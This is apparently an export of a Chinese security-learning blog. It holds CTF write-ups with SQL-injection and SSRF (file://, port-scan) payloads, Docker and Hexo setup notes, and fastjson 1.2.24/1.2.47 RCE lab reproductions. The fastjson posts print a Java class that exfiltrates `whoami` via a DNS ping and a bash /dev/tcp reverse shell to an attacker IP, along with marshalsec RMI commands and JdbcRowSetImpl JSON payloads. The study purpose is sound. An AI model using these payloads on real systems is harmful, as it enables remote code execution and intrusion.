<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
<p>贴上Y4tacker师傅的</p>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
<p>又因为and的优先级比or高，那就又相当于</p>
<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
<p>or右边的值为1，可以读出id=26的数据</p>
<p>还可以盲注</p>
<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
]]></content>
      <categories>
        <category>ctf-sql</category>
      </categories>
      <tags>
        <tag>ctf-sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhub之ssrf</title>
    <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
    <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接构造url<code>?url=http://127.0.0.1/flag.php</code></p>
<p><img src="https://i.loli.net/2021/07/19/ZWTUa7RtHKGEQe4.png" alt="image-20210719213700332"></p>
<h2 id="伪协议读取文件（file协议）"><a href="#伪协议读取文件（file协议）" class="headerlink" title="伪协议读取文件（file协议）"></a>伪协议读取文件（file协议）</h2><p>尝试去读取一下Web目录下的flag.php吧</p>
<p>linux网站的默认目录是<code>/var/www/html</code></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>?url=file:///var/www/html/flag.php</code></p>
<p><img src="https://i.loli.net/2021/07/19/milXBUDKG3nLSIw.png" alt="image-20210719214708812"></p>
<p>右键查看页面源码</p>
<p><img src="https://i.loli.net/2021/07/19/SzAmxP7aE5Yd8wV.png" alt="image-20210719214812341"></p>
<h2 id="端口扫描（http-dict协议）"><a href="#端口扫描（http-dict协议）" class="headerlink" title="端口扫描（http/dict协议）"></a>端口扫描（http/dict协议）</h2><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
<blockquote>
<p>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p>
</blockquote>
<p>这里要对ip进行内网端口探测，使用burp抓包跑一下</p>
<p>对端口参数添加一下变量</p>
<p><img src="https://i.loli.net/2021/07/19/SGa76DWRfLE1hkp.png" alt="image-20210719220453504"></p>
<blockquote>
<p>这里还可以是dict协议</p>
</blockquote>
<p>设置一下参数</p>
<p><img src="https://i.loli.net/2021/07/19/N1MW9yt2AOE8DFx.png" alt="image-20210719220428828"></p>
<p>根据长度找到开放的端口为8347，flag存在于响应包中</p>
<p><img src="https://i.loli.net/2021/07/19/Tbrcm2OsxAEa4n3.png" alt="image-20210719220708156"></p>
<h2 id="第二部分-gopher协议"><a href="#第二部分-gopher协议" class="headerlink" title="第二部分 gopher协议"></a>第二部分 gopher协议</h2><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>dnslog盲打</title>
    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>docker基本使用</title>
    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>


<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>


<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/18/Kc418tknQyboP2B.png" alt="image-20210417215354480"></p>
<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数解释：</p>
<p>-d 镜像在后台运行</p>
<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
</blockquote>
<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
<p><img src="https://i.loli.net/2021/07/18/3SrifKmUEc4gDjH.png" alt="image-20210417222849702"></p>
<blockquote>
<p>请注意这张图片中的容器端口8801是错误的</p>
</blockquote>
<p>但是会报错，是因为没有开启ipv4转发</p>
<blockquote>
<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
</blockquote>
<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
<p><img src="https://i.loli.net/2021/07/18/SzxIcodBJ8OKXlP.png" alt="image-20210417222634372"></p>
<p>重启服务并查看修改是否成功</p>
<p><img src="https://i.loli.net/2021/07/18/eEBdl8F42iau5h7.png" alt="image-20210417222728689"></p>
<blockquote>
<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/18/bw2fHrsI69uhdyN.png" alt="image-20210418160119935"></p>
<blockquote>
<p>成功访问</p>
</blockquote>
<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/18/iObYJydP1umQ5ea.png" alt="image-20210417223707346"></p>
<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/18/fqElpH7iRYBAKDQ.png" alt="image-20210417223949376"></p>
<p><img src="https://i.loli.net/2021/07/18/aNjniAr1lCGOJe5.png" alt="image-20210418160159989"></p>
<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
<blockquote>
<p>删除容器和镜像时需要注意的是：</p>
<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
</blockquote>
<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson-1.2.24-rce</title>
    <url>/2021/09/16/fastjson-1-2-24-rce/</url>
    <content><![CDATA[<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson-1.2.24-rce"></a>fastjson-1.2.24-rce</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>java处理JSON数据有三个比较流行的类库</p>
<ul>
<li>gson(google维护)</li>
<li>jackson</li>
<li>以及主角fastjson</li>
</ul>
<blockquote>
<p>fastjson是阿里巴巴一个开源的json相关的java library</p>
</blockquote>
<p>fastjson简介</p>
<blockquote>
<p>Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上</p>
<p>它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象</p>
</blockquote>
<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，也就是未对<code>@type</code>中加载进的类进行过滤，导致的这一版漏洞</p>
<blockquote>
<p>主要由于利用templatesImlp这个类，这个类中有一个_bytecodes字段，部分函数能够根据这个字段来生成类的实例，这个类的构造函数是我们可控的，就能rce</p>
</blockquote>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>fastjson 1.2.22-1.2.24</p>
<h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>攻击机：kali/vps（恶意java文件所在以及开启RMI服务）</p>
<p>靶机：另一台vps（vulhub靶场环境）</p>
<p><strong>jkd1.8 + maven 3.3.9</strong></p>
<p>maven安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;</span><br><span class="line"># 解压</span><br><span class="line">tar -zxvf </span><br><span class="line"># 配置环境变量</span><br><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">添加</span><br><span class="line">export MAVEN_HOME&#x3D;&#x2F;xxx&#x2F;apache-maven-3.3.9 &#x2F;&#x2F;maven位置</span><br><span class="line">export PATH&#x3D;$&#123;PATH&#125;:$&#123;MAVEN_HOME&#125;&#x2F;bin</span><br><span class="line"># 更新配置</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/16/gVY59HIiWMf64s1.png" alt="image-20210916184550020"></p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问8090端口</p>
<p><img src="https://i.loli.net/2021/09/16/zpdBxQsut6OJlPg.png" alt="image-20210916182541274"></p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>编写恶意类，编译为class文件</li>
<li>在class的目录用python开一个HTTP服务</li>
<li>marshalsec起一个RMI服务</li>
<li>burp构造包触发反序列化点远程加载恶意类</li>
</ul>
<blockquote>
<p>marshalsec是一款快速开启RMI和LDAP服务神器，由maven编译</p>
<p>RMI是远程方法调用，是一种实现远程过程调用的java api</p>
</blockquote>
<h4 id="编译生成-class文件"><a href="#编译生成-class文件" class="headerlink" title="编译生成.class文件"></a>编译生成.class文件</h4><p>dnslog.java文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class dnslog&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123; &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;ping user.&#96;whoami&#96;.dnslog地址&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>javac dnslog.java</code>生成.class文件</p>
<p>在当前目录下</p>
<h4 id="python起一个http服务"><a href="#python起一个http服务" class="headerlink" title="python起一个http服务"></a>python起一个http服务</h4><p>监听在1234端口上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1234</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/18/rg6JR59tK7vekmD.png" alt="image-20210918102037413"></p>
<h4 id="marshalsec起一个RMI服务"><a href="#marshalsec起一个RMI服务" class="headerlink" title="marshalsec起一个RMI服务"></a>marshalsec起一个RMI服务</h4><blockquote>
<p>HTTPServer服务与RMI可以在同一个服务器</p>
</blockquote>
<p>监听9999端口并加载远程类dnslog.class</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line"># mvn编译 marshalsec项目</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/18/VWxKP8bMJFlETmo.png" alt="image-20210918101747298"></p>
<p>编译完成会出现<code>BUILD SUCCESS</code>，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件</p>
<p><img src="https://i.loli.net/2021/09/18/hojsertI9Rkpmg2.png" alt="image-20210918102149353"></p>
<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar在本机9999端口开启一个RMI服务来加载dnslog.class文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;生成dnslog.class的ip:1234&#x2F;#dnslog&quot; 9999</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/18/diZaMBHJE6x3vkf.png" alt="image-20210918103013374"></p>
<h4 id="burp构造请求包"><a href="#burp构造请求包" class="headerlink" title="burp构造请求包"></a>burp构造请求包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机Ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;b&quot;:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;生成dnslog.class的服务器ip:9999&#x2F;dnslog&quot;,</span><br><span class="line">            &quot;autoCommit&quot;:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>后来又在另一台vps上搭建了jdk+maven环境进行测试</p>
<p><img src="https://i.loli.net/2021/09/17/kMCgWVD1Zxmj6Ki.png" alt="image-20210917210129994"></p>
<p>但是要访问的文件不存在，代码没整明白，请求包中构造错了</p>
<p><u>xxx/ceye.io改为dnslog</u></p>
<p><img src="https://i.loli.net/2021/09/17/FEkLDANtGj4svyX.png" alt="image-20210917212757304"></p>
<p>过了十分钟又有请求了，但还是不行</p>
<p>然后就一直访问不上，<del>怀疑是ceye.io存在问题，ceye.io也没有接收到数据</del></p>
<p>ps:我只有在挂代理的情况下才能比较温蒂访问到这个网站，有时还不能成功</p>
<blockquote>
<p>换了一个dnslog平台还是不行</p>
</blockquote>
<p>又耗了半天，暂时没有复现成功，</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里是想要使用dnslog进行盲打，但目前没有成功</p>
<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><ul>
<li>记得开启防火墙对应端口并在安全组添加策略，或是直接关闭防火墙</li>
</ul>
<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/CoLo/p/14499041.html">Fastjson1.2.24RCE漏洞复现</a></p>
<p><a href="https://www.freebuf.com/articles/web/242712.html">Fastjson1.2.24漏洞复现详细过程（freebuf）</a></p>
<p><a href="https://www.cnblogs.com/cute-puli/p/13466362.html">漏洞复现-fastjson1.2.24-RCE</a></p>
<p><a href="https://xz.aliyun.com/t/7104">某json 黑盒盲测与白盒审计（阿里先知）</a></p>
]]></content>
      <categories>
        <category>fastjson</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.47-rce</title>
    <url>/2021/09/20/fastjson-1-2-47-rce/</url>
    <content><![CDATA[<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47-rce"></a>fastjson 1.2.47-rce</h2><p><img src="https://i.loli.net/2021/09/22/nuHJF8jqwGcCmXz.png" alt="img"></p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
<p><img src="https://i.loli.net/2021/09/22/mJi7VDOIvstxu4k.png" alt="image-20210922211752091"></p>
<p>注意jdk版本会影响该漏洞复现</p>
<ul>
<li>两种不同协议实现反弹shell有jdk版本要求,<strong>而且最后接收shell的vps的JDK版本要和靶机的版本相近</strong></li>
</ul>
<blockquote>
<p>下图jdk版本不存在该漏洞</p>
<p><img src="https://i.loli.net/2021/09/22/Nw3SFaVJGCIRXg8.png" alt="img"></p>
</blockquote>
<p>访问8090端口</p>
<p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
<ul>
<li>编译生成恶意类.class</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>python开启一个临时web服务<code>SimpleHTTPServer</code></li>
</ul>
<p><code>python -m  SimpleHTTPServer 4444</code></p>
<blockquote>
<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
</blockquote>
<ul>
<li>marshalsec开启LDAP或是RMI监听</li>
</ul>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
<blockquote>
<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
</blockquote>
<ul>
<li>burp发送poc</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
]]></content>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo初使用</title>
    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
</blockquote>
<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
<li>Node.js</li>
<li>git</li>
<li>hexo</li>
<li>GitHub账号</li>
</ul>
<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
<p>配置全局变量,并生成密钥</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
<blockquote>
<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
</blockquote>
<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
<li>npm install hexo-deployer-git –save</li>
</ul>
<blockquote>
<p>要在博客目录下右键git bash运行</p>
</blockquote>
<ul>
<li>hexo clean （清除缓存和静态文件）</li>
<li>hexo g （生成静态文件）</li>
<li>hexo d （部署）</li>
</ul>
<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
<blockquote>
<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
</blockquote>
<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
<ul>
<li>安装插件</li>
<li>_config.yml选项设置</li>
<li>使用相对路径</li>
</ul>
<blockquote>
<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
</blockquote>
<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
